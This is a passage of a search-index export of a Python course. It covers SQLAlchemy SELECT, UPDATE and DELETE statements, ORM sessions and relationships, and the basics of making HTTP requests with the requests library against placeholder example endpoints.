    "section": "9.6 Using SELECT Statements with SQLAlchemy",
    "text": "9.6 Using SELECT Statements with SQLAlchemy\nThe select() function in SQLAlchemy generates a Select construct used for all SELECT queries. When passed to methods like Connection.execute() in Core and Session.execute() in ORM, a SELECT statement is emitted in the current transaction and the result rows are available via the returned Result object.\n\n9.6.1 The select() SQL Expression Construct\nThe select() construct builds a SELECT statement in a generative manner, where each method builds more state onto the object. It can be stringified to see the SQL being generated:\nfrom sqlalchemy import select\n\nstmt = select(user_table).where(user_table.c.name == \"spongebob\")\nprint(stmt)\nOutput:\nSELECT user_account.id, user_account.name, user_account.fullname\nFROM user_account\nWHERE user_account.name = :name_1\nTo execute the statement and fetch the results:\nwith engine.connect() as conn:\n    for row in conn.execute(stmt):\n        print(row)\nOutput:\nBEGIN (implicit)\nSELECT user_account.id, user_account.name, user_account.fullname\nFROM user_account\nWHERE user_account.name = ?\n[...] ('spongebob',)\n(1, 'spongebob', 'Spongebob Squarepants')\nROLLBACK\nWhen using the ORM, a select() construct composed against ORM entities can be executed using the Session.execute() method on the Session:\nstmt = select(User).where(User.name == \"spongebob\")\nwith Session(engine) as session:\n    for row in session.execute(stmt):\n        print(row)\nOutput:\nBEGIN (implicit)\nSELECT user_account.id, user_account.name, user_account.fullname\nFROM user_account\nWHERE user_account.name = ?\n[...] ('spongebob',)\n(User(id=1, name='spongebob', fullname='Spongebob Squarepants'),)\nROLLBACK\n\n\n9.6.2 Setting the COLUMNS and FROM Clause\nThe select() function can accept positional elements representing any number of Column and/or Table expressions:\nprint(select(user_table))\nOutput:\nSELECT user_account.id, user_account.name, user_account.fullname\nFROM user_account\nSelecting specific columns:\nprint(select(user_table.c.name, user_table.c.fullname))\nOutput:\nSELECT user_account.name, user_account.fullname\nFROM user_account\n\n\n9.6.3 Selecting ORM Entities and Columns\nSelecting from ORM entities works similarly to selecting from tables. Here’s an example:\nprint(select(User))\nOutput:\nSELECT user_account.id, user_account.name, user_account.fullname\nFROM user_account\nWhen executing this statement with the ORM, the result rows contain instances of the User class:\nrow = session.execute(select(User)).first()\nprint(row)\nOutput:\n(User(id=1, name='spongebob', fullname='Spongebob Squarepants'),)\nTo get the first element directly:\nuser = session.scalars(select(User)).first()\nprint(user)\nOutput:\nUser(id=1, name='spongebob', fullname='Spongebob Squarepants')\n\n\n9.6.4 The WHERE Clause\nSQLAlchemy allows composing SQL expressions using standard Python operators:\nprint(user_table.c.name == \"squidward\")\nOutput:\nuser_account.name = :name_1\nUsing these expressions in the WHERE clause:\nprint(select(user_table).where(user_table.c.name == \"squidward\"))\nOutput:\nSELECT user_account.id, user_account.name, user_account.fullname\nFROM user_account\nWHERE user_account.name = :name_1\nCombining multiple expressions with AND:\nprint(select(address_table.c.email_address).where(user_table.c.name == \"squidward\").where(address_table.c.user_id == user_table.c.id))\nOutput:\nSELECT address.email_address\nFROM address, user_account\nWHERE user_account.name = :name_1 AND address.user_id = user_account.id\n\n\n9.6.5 Explicit FROM Clauses and JOINs\nThe FROM clause can be inferred from the columns selected or set explicitly using select_from():\nprint(select(user_table.c.name).select_from(user_table))\nOutput:\nSELECT user_account.name\nFROM user_account\nJoining tables:\nprint(select(user_table.c.name, address_table.c.email_address).join(address_table))\nOutput:\nSELECT user_account.name, address.email_address\nFROM user_account JOIN address ON user_account.id = address.user_id\n\n\n9.6.6 ORDER BY, GROUP BY, HAVING\nOrdering results:\nprint(select(user_table).order_by(user_table.c.name))\nOutput:\nSELECT user_account.id, user_account.name, user_account.fullname\nFROM user_account\nORDER BY user_account.name\nGrouping results:\nstmt = select(User.name, func.count(Address.id).label(\"count\")).join(Address).group_by(User.name).having(func.count(Address.id) &gt; 1)\nwith engine.connect() as conn:\n    result = conn.execute(stmt)\n    print(result.all())\nOutput:\nBEGIN (implicit)\nSELECT user_account.name, count(address.id) AS count\nFROM user_account JOIN address ON user_account.id = address.user_id GROUP BY user_account.name\nHAVING count(address.id) &gt; ?\n[...] (1,)\n[('sandy', 2)]\nROLLBACK\n\n\n9.6.7 Subqueries and CTEs\nCreating and using subqueries:\nsubq = select(func.count(address_table.c.id).label(\"count\"), address_table.c.user_id).group_by(address_table.c.user_id).subquery()\nprint(subq)\nOutput:\nSELECT count(address.id) AS count, address.user_id\nFROM address GROUP BY address.user_id\nUsing subqueries in a larger SELECT:\nstmt = select(user_table.c.name, user_table.c.fullname, subq.c.count).join_from(user_table, subq)\nprint(stmt)\nOutput:\nSELECT user_account.name, user_account.fullname, anon_1.count\nFROM user_account JOIN (SELECT count(address.id) AS count, address.user_id\nFROM address GROUP BY address.user_id) AS anon_1 ON user_account.id = anon_1.user_id\nUsing CTEs (Common Table Expressions):\ncte_obj = select(func.count(address_table.c.id).label(\"count\"), address_table.c.user_id).group_by(address_table.c.user_id).cte()\nstmt = select(user_table.c.name, user_table.c.fullname, cte_obj.c.count).join_from(user_table, cte_obj)\nprint(stmt)\nOutput:\nWITH anon_1 AS\n(SELECT count(address.id) AS count, address.user_id AS user_id\nFROM address GROUP BY address.user_id)\n SELECT user_account.name, user_account.fullname, anon_1.count\nFROM user_account JOIN anon_1 ON user_account.id = anon_1.user_id\n\n\n9.6.8 EXISTS Subqueries\nUsing EXISTS:\nsubq = select(func.count(address_table.c.id)).where(user_table.c.id == address_table.c.user_id).group_by(address_table.c.user_id).having(func.count(address_table.c.id) &gt; 1).exists()\nwith engine.connect() as conn:\n    result = conn.execute(select(user_table.c.name).where(subq))\n    print(result.all())\nOutput:\nBEGIN (implicit)\nSELECT user_account.name\nFROM user_account\nWHERE EXISTS (SELECT count(address.id) AS count_1\nFROM address\nWHERE user_account.id = address.user_id GROUP BY address.user_id\nHAVING count(address.id) &gt; ?)\n[...] (1,)\n[('sandy',)]\nROLLBACK\n\n\n9.6.9 Working with SQL Functions\nUsing SQL functions:\nfrom sqlalchemy import func\n\nstmt = select(func.count()).select_from(user_table)\nwith engine.connect() as conn:\n    result = conn.execute(stmt)\n    print(result.all())\nOutput:\nBEGIN (implicit)\nSELECT count(*) AS count_1\nFROM user_account\n[...] ()\n[(3,)]\nROLLBACK\n\n\n9.6.10 Conclusion\nThis tutorial covers the basics of using the select() function in SQLAlchemy to create SQL SELECT statements and retrieve data from tables. We explored various aspects such as setting columns, using WHERE clauses, performing joins, and using advanced features like subqueries, CTEs, and SQL functions. Understanding these concepts is essential for effective querying in SQLAlchemy applications.",
    "crumbs": [
      "<span class='chapter-number'>9</span>  <span class='chapter-title'>Introduction to Database Interaction with Python</span>"
    ]
  },
  {
    "objectID": "08_python_database_interaction.html#using-update-and-delete-statements-with-sqlalchemy",
    "href": "08_python_database_interaction.html#using-update-and-delete-statements-with-sqlalchemy",
    "title": "9  Introduction to Database Interaction with Python",
    "section": "9.7 Using UPDATE and DELETE Statements with SQLAlchemy",
    "text": "9.7 Using UPDATE and DELETE Statements with SQLAlchemy\nSo far, we’ve covered Insert statements to get data into the database and Select statements to retrieve it. Now, we’ll cover the Update and Delete constructs, used to modify and delete existing rows in a table. This tutorial focuses on these constructs from a Core-centric perspective.\n\n9.7.1 The update() SQL Expression Construct\nThe update() function generates a new instance of Update, representing an SQL UPDATE statement to modify existing data in a table.\nA basic UPDATE statement:\nfrom sqlalchemy import update\n\nstmt = (\n    update(user_table)\n    .where(user_table.c.name == \"patrick\")\n    .values(fullname=\"Patrick the Star\")\n)\nprint(stmt)\nOutput:\nUPDATE user_account SET fullname=:fullname WHERE user_account.name = :name_1\nThe Update.values() method controls the SET elements of the UPDATE statement. You can pass parameters using the column names as keyword arguments.\n\n9.7.1.1 Using Expressions in UPDATE\nYou can use column expressions within the SET clause:\nstmt = update(user_table).values(fullname=\"Username: \" + user_table.c.name)\nprint(stmt)\nOutput:\nUPDATE user_account SET fullname=(:name_1 || user_account.name)\n\n\n9.7.1.2 Executing the Statement with Multiple Parameter Sets\nTo support multiple parameter sets with the same statement, use the bindparam() construct:\nfrom sqlalchemy import bindparam\n\nstmt = (\n    update(user_table)\n    .where(user_table.c.name == bindparam(\"oldname\"))\n    .values(name=bindparam(\"newname\"))\n)\nwith engine.begin() as conn:\n    conn.execute(\n        stmt,\n        [\n            {\"oldname\": \"jack\", \"newname\": \"ed\"},\n            {\"oldname\": \"wendy\", \"newname\": \"mary\"},\n            {\"oldname\": \"jim\", \"newname\": \"jake\"},\n        ],\n    )\nOutput:\nBEGIN (implicit)\nUPDATE user_account SET name=? WHERE user_account.name = ?\n[...] [('ed', 'jack'), ('mary', 'wendy'), ('jake', 'jim')]\nCOMMIT\n\n\n\n9.7.2 Advanced UPDATE Techniques\n\n9.7.2.1 Correlated Updates\nAn UPDATE statement can use rows from other tables by employing a correlated subquery:\nscalar_subq = (\n    select(address_table.c.email_address)\n    .where(address_table.c.user_id == user_table.c.id)\n    .order_by(address_table.c.id)\n    .limit(1)\n    .scalar_subquery()\n)\nupdate_stmt = update(user_table).values(fullname=scalar_subq)\nprint(update_stmt)\nOutput:\nUPDATE user_account SET fullname=(SELECT address.email_address\nFROM address\nWHERE address.user_id = user_account.id ORDER BY address.id\nLIMIT :param_1)\n\n\n9.7.2.2 UPDATE..FROM Syntax\nSome databases support an UPDATE FROM syntax:\nupdate_stmt = (\n    update(user_table)\n    .where(user_table.c.id == address_table.c.user_id)\n    .where(address_table.c.email_address == \"patrick@aol.com\")\n    .values(fullname=\"Pat\")\n)\nprint(update_stmt)\nOutput:\nUPDATE user_account SET fullname=:fullname FROM address\nWHERE user_account.id = address.user_id AND address.email_address = :email_address_1\n\n\n\n9.7.3 The delete() SQL Expression Construct\nThe delete() function generates a new instance of Delete, representing an SQL DELETE statement to remove rows from a table.\nA basic DELETE statement:\nfrom sqlalchemy import delete\n\nstmt = delete(user_table).where(user_table.c.name == \"patrick\")\nprint(stmt)\nOutput:\nDELETE FROM user_account WHERE user_account.name = :name_1\n\n\n9.7.4 Advanced DELETE Techniques\n\n9.7.4.1 Multiple Table Deletes\nLike Update, Delete supports correlated subqueries and backend-specific multiple table syntaxes, such as DELETE FROM..USING on MySQL:\ndelete_stmt = (\n    delete(user_table)\n    .where(user_table.c.id == address_table.c.user_id)\n    .where(address_table.c.email_address == \"patrick@aol.com\")\n)\nfrom sqlalchemy.dialects import mysql\nprint(delete_stmt.compile(dialect=mysql.dialect()))\nOutput:\nDELETE FROM user_account USING user_account, address\nWHERE user_account.id = address.user_id AND address.email_address = %s\n\n\n\n9.7.5 Getting Affected Row Count from UPDATE, DELETE\nBoth Update and Delete support retrieving the number of rows matched after execution via the CursorResult.rowcount attribute:\nwith engine.begin() as conn:\n    result = conn.execute(\n        update(user_table)\n        .values(fullname=\"Patrick McStar\")\n        .where(user_table.c.name == \"patrick\")\n    )\n    print(result.rowcount)\nOutput:\nBEGIN (implicit)\nUPDATE user_account SET fullname=? WHERE user_account.name = ?\n[...] ('Patrick McStar', 'patrick')\n1\nCOMMIT\n\n\n9.7.6 Using RETURNING with UPDATE, DELETE\nThe RETURNING clause can be added using Update.returning() and Delete.returning() methods:\nupdate_stmt = (\n    update(user_table)\n    .where(user_table.c.name == \"patrick\")\n    .values(fullname=\"Patrick the Star\")\n    .returning(user_table.c.id, user_table.c.name)\n)\nprint(update_stmt)\n\ndelete_stmt = (\n    delete(user_table)\n    .where(user_table.c.name == \"patrick\")\n    .returning(user_table.c.id, user_table.c.name)\n)\nprint(delete_stmt)\nOutput for update_stmt:\nUPDATE user_account SET fullname=:fullname\nWHERE user_account.name = :name_1\nRETURNING user_account.id, user_account.name\nOutput for delete_stmt:\nDELETE FROM user_account\nWHERE user_account.name = :name_1\nRETURNING user_account.id, user_account.name\n\n\n9.7.7 Further Reading for UPDATE, DELETE\nSee also:\n\nUpdate\nDelete\nORM-Enabled INSERT, UPDATE, and DELETE Statements\n\nUnderstanding these constructs is crucial for modifying and deleting data efficiently in your SQLAlchemy applications.",
    "crumbs": [
      "<span class='chapter-number'>9</span>  <span class='chapter-title'>Introduction to Database Interaction with Python</span>"
    ]
  },
  {
    "objectID": "08_python_database_interaction.html#prerequisites",
    "href": "08_python_database_interaction.html#prerequisites",
    "title": "9  Introduction to Database Interaction with Python",
    "section": "10.1 Prerequisites",
    "text": "10.1 Prerequisites\nBefore diving into this section, make sure you have gone through the following:\n\nExecuting with an ORM Session: Introduces creating an ORM Session object.\nUsing ORM Declarative Forms to Define Table Metadata: Sets up ORM mappings for entities like User and Address.\nSelecting ORM Entities and Columns: Examples on running SELECT statements for ORM entities.",
    "crumbs": [
      "<span class='chapter-number'>9</span>  <span class='chapter-title'>Introduction to Database Interaction with Python</span>"
    ]
  },
  {
    "objectID": "08_python_database_interaction.html#inserting-rows-using-the-orm-unit-of-work-pattern",
    "href": "08_python_database_interaction.html#inserting-rows-using-the-orm-unit-of-work-pattern",
    "title": "9  Introduction to Database Interaction with Python",
    "section": "10.2 Inserting Rows Using the ORM Unit of Work Pattern",
    "text": "10.2 Inserting Rows Using the ORM Unit of Work Pattern\n\n10.2.1 Instances of Classes Represent Rows\nIn the ORM, instances of your classes (e.g., User, Address) represent rows in the database. Here’s how to create new instances of User:\nsquidward = User(name=\"squidward\", fullname=\"Squidward Tentacles\")\nkrabs = User(name=\"ehkrabs\", fullname=\"Eugene H. Krabs\")\nThese objects are in a transient state, meaning they are not yet associated with any database.\n\n\n10.2.2 Adding Objects to a Session\nTo add these objects to the database, you must add them to a Session:\nsession = Session(engine)\n\nsession.add(squidward)\nsession.add(krabs)\n\nprint(session.new)\n# IdentitySet([User(id=None, name='squidward', fullname='Squidward Tentacles'), User(id=None, name='ehkrabs', fullname='Eugene H. Krabs')])\n\n\n10.2.3 Flushing\nThe Session uses a pattern called unit of work to accumulate changes and then push them to the database. You can manually flush the session to see the pending SQL statements:\nsession.flush()\n# Output will show the INSERT statements\n\n\n10.2.4 Autogenerated Primary Key Attributes\nOnce the rows are inserted, the ORM retrieves the new primary key identifiers for each object:\nprint(squidward.id)  # e.g., 4\nprint(krabs.id)  # e.g., 5\n\n\n10.2.5 Committing\nCommit the transaction to make the changes permanent:\nsession.commit()",
    "crumbs": [
      "<span class='chapter-number'>9</span>  <span class='chapter-title'>Introduction to Database Interaction with Python</span>"
    ]
  },
  {
    "objectID": "08_python_database_interaction.html#updating-orm-objects-using-the-unit-of-work-pattern",
    "href": "08_python_database_interaction.html#updating-orm-objects-using-the-unit-of-work-pattern",
    "title": "9  Introduction to Database Interaction with Python",
    "section": "10.3 Updating ORM Objects Using the Unit of Work Pattern",
    "text": "10.3 Updating ORM Objects Using the Unit of Work Pattern\nTo update objects, load them into a transaction, modify their attributes, and let the Session handle the update during a flush:\nsandy = session.execute(select(User).filter_by(name=\"sandy\")).scalar_one()\n\nsandy.fullname = \"Sandy Squirrel\"\n\nprint(sandy in session.dirty)  # True\n\nsandy_fullname = session.execute(select(User.fullname).where(User.id == 2)).scalar_one()\nprint(sandy_fullname)  # \"Sandy Squirrel\"\n\nprint(sandy in session.dirty)  # False",
    "crumbs": [
      "<span class='chapter-number'>9</span>  <span class='chapter-title'>Introduction to Database Interaction with Python</span>"
    ]
  },
  {
    "objectID": "08_python_database_interaction.html#deleting-orm-objects-using-the-unit-of-work-pattern",
    "href": "08_python_database_interaction.html#deleting-orm-objects-using-the-unit-of-work-pattern",
    "title": "9  Introduction to Database Interaction with Python",
    "section": "10.4 Deleting ORM Objects Using the Unit of Work Pattern",
    "text": "10.4 Deleting ORM Objects Using the Unit of Work Pattern\nTo delete objects, mark them for deletion and let the Session handle the delete during a flush:\npatrick = session.get(User, 3)\n\nsession.delete(patrick)\n\nsession.execute(select(User).where(User.name == \"patrick\")).first()\n# Output will show the DELETE statement\n\n10.4.1 Rolling Back\nRollback the transaction to undo the changes:\nsession.rollback()\n\n\n10.4.2 Closing a Session\nClose the session to release resources and detach objects:\nsession.close()",
    "crumbs": [
      "<span class='chapter-number'>9</span>  <span class='chapter-title'>Introduction to Database Interaction with Python</span>"
    ]
  },
  {
    "objectID": "08_python_database_interaction.html#bulk-multi-row-insert-upsert-update-and-delete",
    "href": "08_python_database_interaction.html#bulk-multi-row-insert-upsert-update-and-delete",
    "title": "9  Introduction to Database Interaction with Python",
    "section": "10.5 Bulk / Multi-Row INSERT, UPSERT, UPDATE, and DELETE",
    "text": "10.5 Bulk / Multi-Row INSERT, UPSERT, UPDATE, and DELETE\nFor performance-intensive tasks involving large numbers of rows, use bulk operations. This mode is crucial when dealing with massive datasets without needing to construct and manipulate individual ORM objects.\nSee the ORM-Enabled INSERT, UPDATE, and DELETE Statements in the ORM Querying Guide for more details.",
    "crumbs": [
      "<span class='chapter-number'>9</span>  <span class='chapter-title'>Introduction to Database Interaction with Python</span>"
    ]
  },
  {
    "objectID": "08_python_database_interaction.html#conclusion-7",
    "href": "08_python_database_interaction.html#conclusion-7",
    "title": "9  Introduction to Database Interaction with Python",
    "section": "10.6 Conclusion",
    "text": "10.6 Conclusion\nUnderstanding the Session and its unit of work pattern is crucial for efficient data manipulation with SQLAlchemy’s ORM. Use the techniques discussed to manage the lifecycle of your objects and perform CRUD operations seamlessly.\nFor further reading:\n\nUpdate\nDelete\nORM-Enabled INSERT, UPDATE, and DELETE Statements\n\nThese resources will help you dive deeper into the capabilities and best practices of using SQLAlchemy’s ORM for data manipulation.",
    "crumbs": [
      "<span class='chapter-number'>9</span>  <span class='chapter-title'>Introduction to Database Interaction with Python</span>"
    ]
  },
  {
    "objectID": "08_python_database_interaction.html#declaring-relationships",
    "href": "08_python_database_interaction.html#declaring-relationships",
    "title": "9  Introduction to Database Interaction with Python",
    "section": "11.1 Declaring Relationships",
    "text": "11.1 Declaring Relationships\n\n11.1.1 Basic Relationship Example\nLet’s start with a simple example of declaring relationships between two classes: User and Address.\nfrom sqlalchemy.orm import Mapped\nfrom sqlalchemy.orm import relationship\nfrom sqlalchemy.ext.declarative import declarative_base\n\nBase = declarative_base()\n\nclass User(Base):\n    __tablename__ = \"user_account\"\n\n    id = mapped_column(Integer, primary_key=True)\n    name = mapped_column(String(50))\n    fullname = mapped_column(String(100))\n    \n    addresses: Mapped[List[\"Address\"]] = relationship(back_populates=\"user\")\n\nclass Address(Base):\n    __tablename__ = \"address\"\n\n    id = mapped_column(Integer, primary_key=True)\n    email_address = mapped_column(String(100))\n    user_id = mapped_column(Integer, ForeignKey(\"user_account.id\"))\n    \n    user: Mapped[\"User\"] = relationship(back_populates=\"addresses\")\nIn this example, the User class has an addresses attribute, and the Address class has a user attribute. The relationship() construct links the two classes, and the back_populates parameter ensures bidirectional relationship management.",
    "crumbs": [
      "<span class='chapter-number'>9</span>  <span class='chapter-title'>Introduction to Database Interaction with Python</span>"
    ]
  },
  {
    "objectID": "08_python_database_interaction.html#persisting-and-loading-relationships",
    "href": "08_python_database_interaction.html#persisting-and-loading-relationships",
    "title": "9  Introduction to Database Interaction with Python",
    "section": "11.2 Persisting and Loading Relationships",
    "text": "11.2 Persisting and Loading Relationships\n\n11.2.1 Creating and Associating Objects\nLet’s create a new User object and associate it with Address objects:\nu1 = User(name=\"pkrabs\", fullname=\"Pearl Krabs\")\nprint(u1.addresses)  # Output: []\n\na1 = Address(email_address=\"pearl.krabs@gmail.com\")\nu1.addresses.append(a1)\nprint(u1.addresses)  # Output: [Address(id=None, email_address='pearl.krabs@gmail.com')]\n\nprint(a1.user)  # Output: User(id=None, name='pkrabs', fullname='Pearl Krabs')\nAdding an Address object to the User.addresses collection also updates the Address.user attribute automatically, thanks to the back_populates parameter.\n\n\n11.2.2 Adding to a Session\nWe need to add the objects to a session to persist them in the database:\nsession.add(u1)\nprint(u1 in session)  # Output: True\nprint(a1 in session)  # Output: True\n\nsession.commit()\nAfter committing the session, the objects are stored in the database, and primary key values are assigned.\n\n\n11.2.3 Loading Relationships\nAccessing a relationship attribute triggers a lazy load if the related objects are not already loaded:\nu1 = session.query(User).filter_by(name=\"pkrabs\").one()\nprint(u1.addresses)  # Triggers a SELECT statement to load addresses",
    "crumbs": [
      "<span class='chapter-number'>9</span>  <span class='chapter-title'>Introduction to Database Interaction with Python</span>"
    ]
  },
  {
    "objectID": "08_python_database_interaction.html#using-relationships-in-queries",
    "href": "08_python_database_interaction.html#using-relationships-in-queries",
    "title": "9  Introduction to Database Interaction with Python",
    "section": "11.3 Using Relationships in Queries",
    "text": "11.3 Using Relationships in Queries\n\n11.3.1 Joining Related Tables\nYou can use relationships to simplify joining related tables:\nstmt = select(Address.email_address).select_from(User).join(User.addresses)\nprint(stmt)\n# Output: SELECT address.email_address FROM user_account JOIN address ON user_account.id = address.user_id\n\n\n11.3.2 Using joinedload() and selectinload()\nThese methods help optimize query performance by loading related objects eagerly:\nfrom sqlalchemy.orm import selectinload, joinedload\n\n# Using selectinload\nstmt = select(User).options(selectinload(User.addresses)).order_by(User.id)\nfor row in session.execute(stmt):\n    print(f\"{row.User.name} ({', '.join(a.email_address for a in row.User.addresses)})\")\n\n# Using joinedload\nstmt = select(Address).options(joinedload(Address.user)).order_by(Address.id)\nfor row in session.execute(stmt):\n    print(f\"{row.Address.email_address} {row.Address.user.name}\")",
    "crumbs": [
      "<span class='chapter-number'>9</span>  <span class='chapter-title'>Introduction to Database Interaction with Python</span>"
    ]
  },
  {
    "objectID": "08_python_database_interaction.html#loader-strategies",
    "href": "08_python_database_interaction.html#loader-strategies",
    "title": "9  Introduction to Database Interaction with Python",
    "section": "11.4 Loader Strategies",
    "text": "11.4 Loader Strategies\n\n11.4.1 Configuring Loader Strategies\nYou can set loader strategies at mapping time or query time to control how related objects are loaded:\n# At mapping time\nclass User(Base):\n    __tablename__ = \"user_account\"\n    addresses: Mapped[List[\"Address\"]] = relationship(back_populates=\"user\", lazy=\"selectin\")\n\n# At query time\nstmt = select(User).options(selectinload(User.addresses)).order_by(User.id)\n\n\n11.4.2 Using raiseload()\nThe raiseload() strategy raises an error when a lazy load is attempted, preventing unwanted lazy loads:\nclass User(Base):\n    __tablename__ = \"user_account\"\n    addresses: Mapped[List[\"Address\"]] = relationship(back_populates=\"user\", lazy=\"raise_on_sql\")\n\nu1 = session.query(User).first()\nu1.addresses  # Raises an InvalidRequestError",
    "crumbs": [
      "<span class='chapter-number'>9</span>  <span class='chapter-title'>Introduction to Database Interaction with Python</span>"
    ]
  },
  {
    "objectID": "08_python_database_interaction.html#conclusion-8",
    "href": "08_python_database_interaction.html#conclusion-8",
    "title": "9  Introduction to Database Interaction with Python",
    "section": "11.5 Conclusion",
    "text": "11.5 Conclusion\nUnderstanding and using relationships in SQLAlchemy’s ORM allows you to efficiently manage and query related data. By defining relationships with relationship(), using the unit of work pattern, and employing appropriate loader strategies, you can optimize your database interactions and maintain clean, readable code. For more details, refer to SQLAlchemy’s Relationship Loading Techniques documentation.",
    "crumbs": [
      "<span class='chapter-number'>9</span>  <span class='chapter-title'>Introduction to Database Interaction with Python</span>"
    ]
  },
  {
    "objectID": "09_python_api_interaction.html",
    "href": "09_python_api_interaction.html",
    "title": "10  Introduction to API Interactions with Python",
    "section": "",
    "text": "10.0.1 Libraries/Tools",
    "crumbs": [
      "<span class='chapter-number'>10</span>  <span class='chapter-title'>Introduction to API Interactions with Python</span>"
    ]
  },
  {
    "objectID": "09_python_api_interaction.html#table-of-contents",
    "href": "09_python_api_interaction.html#table-of-contents",
    "title": "10  Introduction to API Interactions with Python",
    "section": "11.1 Table of Contents",
    "text": "11.1 Table of Contents\n\nIntroduction to requests\nInstalling requests\nMaking HTTP Requests\n\nGET Request\nPOST Request\nPUT Request\nDELETE Request\n\nHandling Responses\n\nStatus Codes\nResponse Content\nJSON Responses\n\nCustomizing Requests\n\nHeaders\nQuery Parameters\nRequest Body\nTimeouts\n\nSession Objects\nHandling Authentication\nError Handling\nAdvanced Usage\n\nStreaming Downloads\nUploading Files\nCustom Transport Adapters\n\nConclusion",
    "crumbs": [
      "<span class='chapter-number'>10</span>  <span class='chapter-title'>Introduction to API Interactions with Python</span>"
    ]
  },
  {
    "objectID": "09_python_api_interaction.html#introduction-to-requests",
    "href": "09_python_api_interaction.html#introduction-to-requests",
    "title": "10  Introduction to API Interactions with Python",
    "section": "11.2 Introduction to requests",
    "text": "11.2 Introduction to requests\nThe requests module allows you to send HTTP requests using Python. It abstracts the complexities of making requests behind a simple API, allowing you to send HTTP requests to interact with web resources like REST APIs.",
    "crumbs": [
      "<span class='chapter-number'>10</span>  <span class='chapter-title'>Introduction to API Interactions with Python</span>"
    ]
  },
  {
    "objectID": "09_python_api_interaction.html#installing-requests",
    "href": "09_python_api_interaction.html#installing-requests",
    "title": "10  Introduction to API Interactions with Python",
    "section": "11.3 Installing requests",
    "text": "11.3 Installing requests\nTo install the requests module, you can use pip:\npip install requests",
    "crumbs": [
      "<span class='chapter-number'>10</span>  <span class='chapter-title'>Introduction to API Interactions with Python</span>"
    ]
  },
  {
    "objectID": "09_python_api_interaction.html#making-http-requests",
    "href": "09_python_api_interaction.html#making-http-requests",
    "title": "10  Introduction to API Interactions with Python",
    "section": "11.4 Making HTTP Requests",
    "text": "11.4 Making HTTP Requests\nThe requests module supports all the major HTTP methods, such as GET, POST, PUT, DELETE, etc. Each method corresponds to a function within the module.\n\n11.4.1 GET Request\nA GET request is used to retrieve data from a server. Here’s how to make a simple GET request:\nimport requests\n\nresponse = requests.get('https://api.example.com/data')\nprint(response.status_code)\nprint(response.text)\n\n\n11.4.2 POST Request\nA POST request is used to send data to a server. Here’s an example:\nimport requests\n\ndata = {'key1': 'value1', 'key2': 'value2'}\nresponse = requests.post('https://api.example.com/data', data=data)\nprint(response.status_code)\nprint(response.text)\n\n\n11.4.3 PUT Request\nA PUT request is used to update data on a server. Here’s an example:\nimport requests\n\ndata = {'key1': 'new_value1', 'key2': 'new_value2'}\nresponse = requests.put('https://api.example.com/data/1', data=data)\nprint(response.status_code)\nprint(response.text)\n\n\n11.4.4 DELETE Request\nA DELETE request is used to delete data from a server. Here’s an example:\nimport requests\n\nresponse = requests.delete('https://api.example.com/data/1')\nprint(response.status_code)\nprint(response.text)",
    "crumbs": [
      "<span class='chapter-number'>10</span>  <span class='chapter-title'>Introduction to API Interactions with Python</span>"
    ]
  },
  {
    "objectID": "09_python_api_interaction.html#handling-responses",
    "href": "09_python_api_interaction.html#handling-responses",
    "title": "10  Introduction to API Interactions with Python",
    "section": "11.5 Handling Responses",
    "text": "11.5 Handling Responses\n\n11.5.1 Status Codes\nHTTP status codes indicate whether a specific HTTP request has been successfully completed. requests allows you to check the status code of the response:\nresponse = requests.get('https://api.example.com/data')\nprint(response.status_code)\nif response.status_code == 200:\n    print(\"Success!\")\nelif response.status_code == 404:\n    print(\"Not Found.\")\n\n\n11.5.2 Response Content\nThe content of the response can be accessed in different ways:\nresponse = requests.get('https://api.example.com/data')\nprint(response.text)  # Raw text content\nprint(response.content)  # Raw binary content\nprint(response.json())  # JSON content (if applicable)\n\n\n11.5.3 JSON Responses\nIf the response contains JSON data, you can directly decode it:\nresponse = requests.get('https://api.example.com/data')\ndata = response.json()\nprint(data)",
    "crumbs": [
      "<span class='chapter-number'>10</span>  <span class='chapter-title'>Introduction to API Interactions with Python</span>"
    ]
  },
  {
    "objectID": "09_python_api_interaction.html#customizing-requests",
    "href": "09_python_api_interaction.html#customizing-requests",
    "title": "10  Introduction to API Interactions with Python",
    "section": "11.6 Customizing Requests",
    "text": "11.6 Customizing Requests\n\n11.6.1 Headers\nYou can customize the headers sent with your requests:\nheaders = {'User-Agent': 'my-app/0.0.1'}\nresponse = requests.get('https://api.example.com/data', headers=headers)\nprint(response.text)\n\n\n11.6.2 Query Parameters\nYou can add query parameters to your requests:\nparams = {'param1': 'value1', 'param2': 'value2'}\nresponse = requests.get('https://api.example.com/data', params=params)\nprint(response.url)\nprint(response.text)\n\n\n11.6.3 Request Body\nFor POST and PUT requests, you can include data in the request body:\ndata = {'key1': 'value1', 'key2': 'value2'}\nresponse = requests.post('https://api.example.com/data', data=data)\nprint(response.text)\nYou can also send JSON data by using the json parameter:\nimport json\n\ndata = {'key1': 'value1', 'key2': 'value2'}\nresponse = requests.post('https://api.example.com/data', json=data)\nprint(response.text)\n\n\n11.6.4 Timeouts\nYou can specify a timeout for your requests:\nresponse = requests.get('https://api.example.com/data', timeout=5)\nprint(response.text)",
    "crumbs": [
      "<span class='chapter-number'>10</span>  <span class='chapter-title'>Introduction to API Interactions with Python</span>"
    ]
  },
  {
    "objectID": "09_python_api_interaction.html#session-objects",
    "href": "09_python_api_interaction.html#session-objects",
    "title": "10  Introduction to API Interactions with Python",
    "section": "11.7 Session Objects",
    "text": "11.7 Session Objects\nA Session object allows you to persist certain parameters across requests. It also persists cookies across all requests made from the session instance.\nsession = requests.Session()\nsession.headers.update({'User-Agent': 'my-app/0.0.1'})\n\nresponse = session.get('https://api.example.com/data')\nprint(response.text)",
    "crumbs": [
      "<span class='chapter-number'>10</span>  <span class='chapter-title'>Introduction to API Interactions with Python</span>"
    ]
  },
  {
    "objectID": "09_python_api_interaction.html#handling-authentication",
    "href": "09_python_api_interaction.html#handling-authentication",
    "title": "10  Introduction to API Interactions with Python",
    "section": "11.8 Handling Authentication",
    "text": "11.8 Handling Authentication\nThe requests module supports various types of authentication, such as Basic Auth, Digest Auth, OAuth, etc.\n\n11.8.1 Basic Authentication\nfrom requests.auth import HTTPBasicAuth\n\nresponse = requests.get('https://api.example.com/data', auth=HTTPBasicAuth('user', 'pass'))\nprint(response.text)\n\n\n11.8.2 Bearer Token Authentication\nheaders = {'Authorization': 'Bearer YOUR_ACCESS_TOKEN'}\nresponse = requests.get('https://api.example.com/data', headers=headers)\nprint(response.text)",
    "crumbs": [
      "<span class='chapter-number'>10</span>  <span class='chapter-title'>Introduction to API Interactions with Python</span>"
    ]
  },
  {
    "objectID": "09_python_api_interaction.html#error-handling-1",
    "href": "09_python_api_interaction.html#error-handling-1",
